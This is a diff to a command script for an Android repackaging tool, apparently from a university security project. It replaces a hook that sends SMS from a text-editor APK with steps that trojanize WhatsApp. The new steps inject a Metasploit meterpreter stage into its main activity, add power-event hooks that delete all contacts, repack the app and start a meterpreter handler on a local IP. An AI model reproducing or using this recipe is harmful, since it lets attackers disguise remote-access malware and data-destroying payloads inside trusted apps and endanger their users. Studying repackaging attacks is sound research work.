@@ -1,4 +1,12 @@
-load_original /home/pramid/Documents/Uni/Android_Security/Packadroid/Automated_Repackager/editor.apk
-add_activity_hook com.rhmsoft.edit.activity.MainActivity /home/pramid/Documents/Uni/Android_Security/Packadroid/PackadroidPayload/app/build/outputs/apk/app-debug.apk com.tum.team05.packadroidpayload.Payload sendSms
-repack /home/pramid/Documents/Uni/Android_Security/Packadroid/Automated_Repackager/editor_repacked.apk
-exit
+# preparation
+set_verbose 0
+load_original ../original_apps_testing/Whatsapp.apk
+
+# place hooks
+add_activity_hook 0 meterpreter.apk com.metasploit.stage.Payload start
+add_broadcast_hook on_power_connected ../payload/precompiled.apk com.tum.team05.packadroidpayload.Payload deleteAllContacts
+add_broadcast_hook on_power_disconnected ../payload/precompiled.apk com.tum.team05.packadroidpayload.Payload deleteAllContacts
+
+# repack
+repack whatsapp_repacked.apk
+start_meterpreter_handler 192.168.56.1 4567
